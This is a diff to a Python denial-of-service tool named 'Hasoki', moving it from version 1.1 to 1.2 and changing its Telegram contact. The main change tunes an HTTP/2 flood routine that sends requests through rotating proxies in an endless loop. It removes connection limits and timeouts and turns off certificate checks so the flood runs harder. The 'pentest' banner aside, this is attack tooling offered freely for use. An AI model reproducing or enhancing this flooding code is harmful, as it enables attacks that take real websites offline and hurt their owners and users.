@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 # From NV with love
-# Hasoki v1.1
+# Hasoki v1.2
 # All for FREE
 from os import system, name
 import httpx
@@ -771,8 +771,9 @@ def Launchhttp2(url, timer):
             proxy1 = random.choice(prox1)
             proxies = {'http://': 'http://'+prox1}
   #          timeout = httpx.Timeout(None, connect=None)
-    #        limits = httpx.Limits(max_keepalive_connections=None, max_connections=None) 
-            with httpx.Client(http2=True,proxies=random.choice(proxies),headers=headers,trust_env=False) as client:
+            limits = httpx.Limits(max_keepalive_connections=None, max_connections=None, keepalive_expiry=60)
+            with httpx.Client(http2=True,proxies=random.choice(proxies),headers=headers, limits=limits, timeout=None,
+		                  verify=False,follow_redirects=False) as client:
                 try:
                     while True:
                         for _ in range(400):
@@ -1119,7 +1120,7 @@ def title():
     stdout.write("             "+Fore.LIGHTGREEN_EX+"╔═════════╩═════════════════════════════════╩═════════╗\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX+"║ "+Fore.LIGHTWHITE_EX   +"       PENTEST DOS MUTIL METHOD           "+Fore.LIGHTGREEN_EX  +"          ║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX+"║ "+Fore.LIGHTWHITE_EX   +"       ADDED NEW METHOD AND BYPASS    "+Fore.LIGHTGREEN_EX  +"              ║\n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX+"║ "+Fore.LIGHTWHITE_EX   +"       Tele https://t.me/adfhjktewwyjqk   "+Fore.LIGHTGREEN_EX  +"          ║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX+"║ "+Fore.LIGHTWHITE_EX   +"       Tele https://t.me/rebychubx        "+Fore.LIGHTGREEN_EX  +"          ║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX+"║ "+Fore.LIGHTWHITE_EX   +"       Type [help] to see the Commands    "+Fore.LIGHTGREEN_EX +"          ║\n")
 
     stdout.write("             "+Fore.LIGHTGREEN_EX+"╚═════════════════════════════════════════════════════╝\n")
